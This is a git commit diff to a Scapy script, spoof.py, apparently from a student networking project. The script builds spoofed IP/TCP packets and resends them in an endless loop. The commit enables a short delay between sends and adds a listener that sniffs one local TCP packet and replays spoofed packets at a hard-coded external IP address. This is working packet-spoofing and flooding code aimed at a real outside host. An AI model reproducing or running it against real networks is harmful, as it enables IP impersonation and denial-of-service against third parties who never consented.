cf16c820d6233ce0e248a5cc0c309fb8e94b3c99
Jeffreychen99 <jeffrey_chen99@berkeley.edu>
2020-07-24 10:35:42 -0700

    compressing structure

--- scapy/spoof.py
+++ scapy/spoof.py
@@ -11,4 +11,17 @@ def spoof(src_ip, dst_ip, src_port, dst_port):
 	spoofed_packet = IP_Header / TCP_Header / payload
 	while True:
 		send(spoofed_packet)
-		#time.sleep(0.25)
+		time.sleep(0.25)
+
+def listen(packet):
+	print(packet.summary)
+	ip = packet[0][1]
+	tcp = packet[0][1][1]
+	
+	#Scapy_Spoof.spoof(ip.src, ip.dst, tcp.sport, tcp.dport)
+	print(ip.src, " ", ip.dst, " ", tcp.sport, " ", tcp.dport)
+	Scapy_Spoof.spoof(ip.src, '185.230.61.161', tcp.sport, tcp.dport)
+
+
+if __name__ == '__main__':
+	sniff(filter='tcp and src 127.0.0.1', count=1, prn=listen)
